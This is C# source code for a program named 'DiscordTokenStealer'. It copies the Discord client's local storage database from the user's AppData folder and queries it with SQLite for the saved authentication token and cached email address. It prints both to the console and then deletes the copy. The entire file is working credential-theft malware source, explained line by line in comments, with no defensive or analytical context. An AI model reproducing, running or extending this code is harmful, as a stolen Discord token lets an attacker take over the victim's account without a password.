using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SQLite;
using System.Data;
using System.IO;

namespace DiscordTokenStealer
{
    class Program
    {

        static void Main(string[] args)
        {
            Random rnd = new Random(); //Generate random for backup file

            string db_path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\https_discordapp.com_0.localstorage"; //Open discord database
            string db_temp_path = Path.GetDirectoryName(db_path) + "\\" + rnd.Next(0, 999); //We are generating path for copy of database file because we are unable to use database when discord running 

            File.Copy(db_path, db_temp_path); //copy database to our temporary path

            SQLiteConnection sqlconn = new SQLiteConnection("Data Source=" + db_temp_path + ";version=3;Pooling=False"); //prepare sql connection 

            sqlconn.Open(); //Open database

            //We are prepare sql command for receive token value in ItemTable 
            SQLiteCommand command = new SQLiteCommand("Select value FROM ItemTable WHERE key='token'", sqlconn); //Prepare sql command
            SQLiteDataReader reader = command.ExecuteReader(); //Execute command

            reader.Read(); //Perform read
            string token = reader.GetString(0); //Get first entry of selected value


            //We are using same method to receive email address
            command = new SQLiteCommand("Select value FROM ItemTable WHERE key='email_cache'", sqlconn);
            reader = command.ExecuteReader();

            reader.Read();
            string email = reader.GetString(0);

            //Replacing \0 for better result because of email and Token value stored with UNICODE format 
            email = email.Replace("\0", "");
            token = token.Replace("\0", "");

            reader.Close();
            sqlconn.Close();
            sqlconn.Dispose();



            Console.WriteLine("Current Email : " + email);
            Console.WriteLine("Current Token : " + token);

            //Release SQLite handle's
            GC.Collect();
            GC.WaitForPendingFinalizers();

            //Then delete temporary database file
            File.Delete(db_temp_path);

            Console.ReadLine();
        }

    }
}
